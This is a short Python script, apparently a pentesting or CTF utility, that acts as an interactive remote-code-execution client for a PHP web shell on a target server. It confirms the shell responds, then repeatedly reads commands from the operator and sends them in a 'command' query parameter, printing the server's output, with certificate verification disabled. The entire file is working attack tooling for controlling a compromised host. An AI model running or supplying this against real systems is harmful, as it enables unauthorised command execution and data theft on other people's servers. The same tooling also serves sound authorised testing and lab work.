#!/usr/bin/python3

import requests
import sys
from requests.exceptions import ConnectionError


# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Remote Code Execution')
        print('    >> https://www.github.com/gh0x0st\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
output = Interface()

# Banner
output.header()

# Check for arguments
if len(sys.argv) < 2:
    output.info("Usage: python3 rce.py http://127.0.0.1/shell.php")
    sys.exit()

# Get input from the command line
target = sys.argv[1]
output.info(f"Attempting a connection with {target}")

# Can we connect to the shell?
try:
    r = requests.get(target)
    if r.status_code == 200:
        output.success('Successfully connected to web shell\n')
    else:
        raise Exception
except ConnectionError:
    output.error('We were unable to establish a connection')
    sys.exit()
except:
    output.error('Something unexpected happened')
    sys.exit()

# Remote code execution
while True:
    try:
        cmd = input("\033[91mRCE\033[0m > ")
        if cmd == 'exit':
            raise KeyboardInterrupt
        r = requests.get(target + "?command=" + cmd, verify=False)
        if r.status_code == 200:
            print(r.text)
        else:
            raise Exception
    except KeyboardInterrupt:
        sys.exit()
    except ConnectionError:
        output.error('We lost our connection to the web shell')
        sys.exit()
    except:
        output.error('Something unexpected happened')
        sys.exit()